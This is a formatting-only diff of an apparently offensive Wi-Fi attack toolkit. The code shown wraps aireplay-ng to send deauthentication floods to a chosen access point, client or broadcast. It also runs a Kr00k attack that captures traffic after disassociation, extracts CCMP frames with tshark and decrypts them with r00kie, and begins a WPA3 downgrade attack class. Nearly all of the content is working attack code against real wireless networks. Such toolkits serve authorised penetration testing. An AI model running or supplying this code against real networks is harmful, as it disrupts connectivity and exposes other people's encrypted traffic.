@@ -28,14 +28,10 @@ class DeauthAttack(BaseAttack):
     Can target specific clients (targeted) or broadcast (all clients).
     """
 
-    def __init__(
-        self,
-        interface: str,
-        output_dir: str | None = None,
-        attack_timeout: int = 30,
-    ):
+    def __init__(self, interface: str, output_dir: str | None = None, attack_timeout: int = 30):
         if output_dir is None:
             from urban_hs.core.config import get_config
+
             output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "deauth")
         super().__init__(interface, output_dir, attack_timeout)
 
@@ -65,13 +61,11 @@ class DeauthAttack(BaseAttack):
 
         try:
             self._log("Starting deauth attack", bssid=target_bssid, client=client_mac, count=count)
-            self._notify_callback(callback, f"Sending {count} deauth packets to {client_mac or 'broadcast'}")
+            self._notify_callback(
+                callback, f"Sending {count} deauth packets to {client_mac or 'broadcast'}"
+            )
 
-            cmd = [
-                "aireplay-ng",
-                "-0", str(count),
-                "-a", target_bssid,
-            ]
+            cmd = ["aireplay-ng", "-0", str(count), "-a", target_bssid]
 
             if client_mac:
                 cmd.extend(["-c", client_mac])
@@ -82,9 +76,7 @@ class DeauthAttack(BaseAttack):
             cmd.append(self.interface)
 
             proc = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
 
             stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=30)
@@ -94,7 +86,9 @@ class DeauthAttack(BaseAttack):
 
             if proc.returncode == 0:
                 result.status = AttackStatus.SUCCESS
-                self._notify_callback(callback, f"Deauth sent successfully to {client_mac or 'all clients'}")
+                self._notify_callback(
+                    callback, f"Deauth sent successfully to {client_mac or 'all clients'}"
+                )
             else:
                 result.status = AttackStatus.FAILED
                 stderr_str = stderr.decode()
@@ -128,6 +122,7 @@ class Kr00kAttack(BaseAttack):
     ):
         if output_dir is None:
             from urban_hs.core.config import get_config
+
             output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "kr00k")
         super().__init__(interface, output_dir, attack_timeout)
         self.deauth_count = deauth_count
@@ -173,9 +168,7 @@ class Kr00kAttack(BaseAttack):
             self._notify_callback(callback, f"Starting Kr00k attack on channel {channel}")
 
             airodump_proc = await self._start_airodump(
-                bssid=target_bssid,
-                channel=channel,
-                output_prefix=str(self.output_dir / base_name),
+                bssid=target_bssid, channel=channel, output_prefix=str(self.output_dir / base_name)
             )
 
             await asyncio.sleep(2)
@@ -196,7 +189,9 @@ class Kr00kAttack(BaseAttack):
                 self._log("Deauth failed, continuing capture anyway")
 
             self._log("Capturing post-disassociation traffic", duration=self.capture_after_deauth)
-            self._notify_callback(callback, f"Capturing for {self.capture_after_deauth}s after disassociation")
+            self._notify_callback(
+                callback, f"Capturing for {self.capture_after_deauth}s after disassociation"
+            )
 
             await asyncio.sleep(self.capture_after_deauth)
 
@@ -213,7 +208,9 @@ class Kr00kAttack(BaseAttack):
             if kr00k_frames > 0:
                 result.status = AttackStatus.SUCCESS
                 result.metadata["kr00k_frames_found"] = kr00k_frames
-                self._notify_callback(callback, f"Kr00k vulnerability confirmed: {kr00k_frames} frames")
+                self._notify_callback(
+                    callback, f"Kr00k vulnerability confirmed: {kr00k_frames} frames"
+                )
             else:
                 result.status = AttackStatus.FAILED
                 result.metadata["kr00k_frames_found"] = 0
@@ -243,19 +240,25 @@ class Kr00kAttack(BaseAttack):
 
         try:
             cmd = [
-                "tshark", "-r", str(cap_file),
-                "-Y", "wlan.fc.type == 2 and wlan_ccmp",
-                "-T", "fields",
-                "-e", "wlan.sa",
-                "-e", "wlan.da",
-                "-e", "wlan_ccmp.key",
-                "-e", "frame.number",
+                "tshark",
+                "-r",
+                str(cap_file),
+                "-Y",
+                "wlan.fc.type == 2 and wlan_ccmp",
+                "-T",
+                "fields",
+                "-e",
+                "wlan.sa",
+                "-e",
+                "wlan.da",
+                "-e",
+                "wlan_ccmp.key",
+                "-e",
+                "frame.number",
             ]
 
             proc = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
             stdout, _ = await proc.communicate()
 
@@ -277,6 +280,7 @@ class Kr00kAttack(BaseAttack):
         """Attempt to decrypt Kr00k frames using r00kie-kr00kie tool."""
         try:
             import shutil
+
             if not shutil.which("r00kie"):
                 self._log("r00kie not available, skipping decryption")
                 return None
@@ -285,9 +289,7 @@ class Kr00kAttack(BaseAttack):
             cmd = ["r00kie", "-i", str(cap_file), "-o", str(output_file)]
 
             proc = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
+                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
             )
             stdout, stderr = await proc.communicate()
 
@@ -322,7 +324,10 @@ class WPA3DowngradeAttack(BaseAttack):
     ):
         if output_dir is None:
             from urban_hs.core.config import get_config
-            output_dir = str(Path(get_config().storage.resolve_wifi_attacks_dir()) / "wpa3_downgrade")
+
+            output_dir = str(
+                Path(get_config().storage.resolve_wifi_attacks_dir()) / "wpa3_downgrade"
+            )
         super().__init__(interface, output_dir, attack_timeout)
         self.deauth_count = deauth_count
         self.deauth_attack = DeauthAttack(interface, attack_timeout=30)
